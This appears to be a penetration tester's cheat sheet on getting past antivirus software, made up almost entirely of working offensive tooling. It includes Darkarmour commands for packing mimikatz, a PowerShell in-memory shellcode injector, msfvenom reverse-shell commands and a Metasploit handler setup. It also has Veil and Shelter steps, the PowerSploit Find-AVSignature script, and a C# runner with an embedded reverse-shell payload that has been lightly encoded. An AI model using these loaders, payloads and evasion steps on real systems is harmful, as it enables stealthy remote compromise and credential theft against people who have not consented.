### Darkarmour
https://github.com/bats3c/darkarmour  
python3 darkarmour.py -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -e xor -j -k darkbyte -l 500 -u -o /home/kali/Desktop/b_m.exe
```
 -f FILE, --file FILE  file to crypt, assumed as binary if not told otherwise
  -e ENCRYPT, --encrypt ENCRYPT
                        encryption algorithm to use (xor)
  -S SHELLCODE, --shellcode SHELLCODE
                        file contating the shellcode, needs to be in the
                        'msfvenom -f raw' style format
  -b, --binary          provide if file is a binary exe
  -d, --dll             use reflective dll injection to execute the binary
                        inside another process
  -u, --upx             pack the executable with upx
  -j, --jmp             use jmp based pe loader
  -r, --runpe           use runpe to load pe
  -s, --source          provide if the file is c source code
  -k KEY, --key KEY     key to encrypt with, randomly generated if not
                        supplied
  -l LOOP, --loop LOOP  number of levels of encryption
  -o OUTFILE, --outfile OUTFILE
                        name of outfile, if not provided then random filename
                        is assigned
```
### Remote Process Memory Injection
#### PowerShell In-Memory Injection
```
ps_bypass.ps1:
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here,no quotes here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

ShellCode: 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell(shikata_ga_nai don't work here)

Powershell Execution Policy Config:
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
### Shelter
```
1. msfconsole:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOST ip
set LPORT port
set AutoRunScript post/windows/manage/migrate
exploit
1.1 metasploit backgroup commands:
bg
show sessions
sessions id
2. Use shelter to inject msfpayload into exe(tracing must be successfully)
```
### Veil framwork
#### evade AV
```
sudo apt -y install veil
sudo /usr/share/veil/config/setup.sh --force --silent
use AV Evasion
set payload 
set LHOST
generate
```
### Find-AVSignature.ps1
```
function Find-AVSignature
{
<#
.SYNOPSIS

Locate tiny AV signatures.

PowerSploit Function: Find-AVSignature
Authors: Chris Campbell (@obscuresec) & Matt Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Locates single Byte AV signatures utilizing the same method as DSplit from "class101" on heapoverflow.com.

.PARAMETER Startbyte

Specifies the first byte to begin splitting on.

.PARAMETER Endbyte

Specifies the last byte to split on.

.PARAMETER Interval

Specifies the interval size to split with.

.PARAMETER Path

Specifies the path to the binary you want tested.

.PARAMETER OutPath

Optionally specifies the directory to write the binaries to.

.PARAMETER BufferLen

Specifies the length of the file read buffer .  Defaults to 64KB.  

.PARAMETER Force

Forces the script to continue without confirmation.    

.EXAMPLE
Import-Module .\Find-AVSignature.ps1
PS C:\> Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run2 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 16000 -EndByte 17000 -Interval 100 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run3 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 16800 -EndByte 16900 -Interval 10 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run4 -Verbose -Force
PS C:\> Find-AVSignature -StartByte 16890 -EndByte 16900 -Interval 1 -Path C:\test\exempt\nc.exe -OutPath c:\test\output\run5 -Verbose -Force

.NOTES

Several of the versions of "DSplit.exe" available on the internet contain malware.

.LINK

http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html
https://github.com/mattifestation/PowerSploit
http://www.exploit-monday.com/
http://heapoverflow.com/f0rums/project.php?issueid=34&filter=changes&page=2
#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory = $True)]
        [ValidateRange(0,4294967295)]
		[UInt32]
        $StartByte,

        [Parameter(Mandatory = $True)]
        [String]
        $EndByte,

        [Parameter(Mandatory = $True)]
        [ValidateRange(0,4294967295)]
		[UInt32]
        $Interval,

        [String]
		[ValidateScript({Test-Path $_ })]
        $Path = ($pwd.path),

        [String]
        $OutPath = ($pwd),
		
		
		[ValidateRange(1,2097152)]
		[UInt32]
		$BufferLen = 65536,
		
        [Switch] $Force
		
    )

    #test variables
    if (!(Test-Path $Path)) {Throw "File path not found"}
    $Response = $True
    if (!(Test-Path $OutPath)) {
        if ($Force -or ($Response = $psCmdlet.ShouldContinue("The `"$OutPath`" does not exist! Do you want to create the directory?",""))){new-item ($OutPath)-type directory}
	}
    if (!$Response) {Throw "Output path not found"}
    if (!(Get-ChildItem $Path).Exists) {Throw "File not found"}
    [Int32] $FileSize = (Get-ChildItem $Path).Length
    if ($StartByte -gt ($FileSize - 1) -or $StartByte -lt 0) {Throw "StartByte range must be between 0 and $Filesize"}
    [Int32] $MaximumByte = (($FileSize) - 1)
    if ($EndByte -ceq "max") {$EndByte = $MaximumByte}
	
	#Recast $Endbyte into an Integer so that it can be compared properly. 
	[Int32]$EndByte = $EndByte 
	
	#If $Endbyte is greater than the file Length, use $MaximumByte.
    if ($EndByte -gt $FileSize) {$EndByte = $MaximumByte}
	
	#If $Endbyte is less than the $StartByte, use 1 Interval past $StartByte.
	if ($EndByte -lt $StartByte) {$EndByte = $StartByte + $Interval}

	Write-Verbose "StartByte: $StartByte"
	Write-Verbose "EndByte: $EndByte"
	
    #find the filename for the output name
    [String] $FileName = (Split-Path $Path -leaf).Split('.')[0]

    #Calculate the number of binaries
    [Int32] $ResultNumber = [Math]::Floor(($EndByte - $StartByte) / $Interval)
    if (((($EndByte - $StartByte) % $Interval)) -gt 0) {$ResultNumber = ($ResultNumber + 1)}
    
    #Prompt user to verify parameters to avoid writing binaries to the wrong directory
    $Response = $True
    if ( $Force -or ( $Response = $psCmdlet.ShouldContinue("This script will result in $ResultNumber binaries being written to `"$OutPath`"!",
             "Do you want to continue?"))){}
    if (!$Response) {Return}
    
    Write-Verbose "This script will now write $ResultNumber binaries to `"$OutPath`"." 
    [Int32] $Number = [Math]::Floor($Endbyte/$Interval)
    
		#Create a Read Buffer and Stream. 
		#Note: The Filestream class takes advantage of internal .NET Buffering.  We set the default internal buffer to 64KB per http://research.microsoft.com/pubs/64538/tr-2004-136.doc.
		[Byte[]] $ReadBuffer=New-Object byte[] $BufferLen
		[System.IO.FileStream] $ReadStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read, $BufferLen)
		
        #write out the calculated number of binaries
        [Int32] $i = 0
        for ($i -eq 0; $i -lt $ResultNumber + 1 ; $i++)
        {
			# If this is the Final Binary, use $EndBytes, Otherwise calculate based on the Interval
			if ($i -eq $ResultNumber) {[Int32]$SplitByte = $EndByte}
			else {[Int32] $SplitByte = (($StartByte) + (($Interval) * ($i)))}
			
			Write-Verbose "Byte 0 -> $($SplitByte)"
			
			#Reset ReadStream to beginning of file
			$ReadStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
			
			#Build a new FileStream for Writing
			[String] $outfile = Join-Path $OutPath "$($FileName)_$($SplitByte).bin"
			[System.IO.FileStream] $WriteStream = New-Object System.IO.FileStream($outfile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None, $BufferLen)
			
			[Int32] $BytesLeft = $SplitByte
			Write-Verbose "$($WriteStream.name)"
			
			#Write Buffer Length to the Writing Stream until the bytes left is smaller than the buffer 
			while ($BytesLeft -gt $BufferLen){
				[Int32]$count = $ReadStream.Read($ReadBuffer, 0, $BufferLen)
				$WriteStream.Write($ReadBuffer, 0, $count)
				$BytesLeft = $BytesLeft - $count
			}
			
			#Write the remaining bytes to the file 
			do {
				[Int32]$count = $ReadStream.Read($ReadBuffer, 0, $BytesLeft)
				$WriteStream.Write($ReadBuffer, 0, $count)
				$BytesLeft = $BytesLeft - $count			
			}
			until ($BytesLeft -eq 0)
			$WriteStream.Close()
			$WriteStream.Dispose()
        }
        Write-Verbose "Files written to disk. Flushing memory."
        $ReadStream.Dispose()
        
		#During testing using large binaries, memory usage was excessive so lets fix that
        [System.GC]::Collect()
        Write-Verbose "Completed!"
}


```
### C#
#### kali install c# compiler
sudo apt update
sudo apt install mono-complete
mcs hello.cs
mono hello.exe
#### C# Shellcode runner by Caesar Cipher shift by 24
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.86.133 LPORT=4444 -f powershell  
```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
            UInt32 dwMilliseconds);
        
        static void Main(string[] args)
        {
            byte[] buf = new byte[460]{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x11,0x5c,0xc0,0xa8,0x56,0x85,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5};
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 24) & 0xFF);
            }
            byte[] buf_new = new byte[460];
            for(int i = 0; i < encoded.Length; i++)
            {
                buf_new[i] = (byte)(((uint)encoded[i] - 24) & 0xFF);
            }


            int size = buf_new.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf_new, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
            
        }
    }
}
```
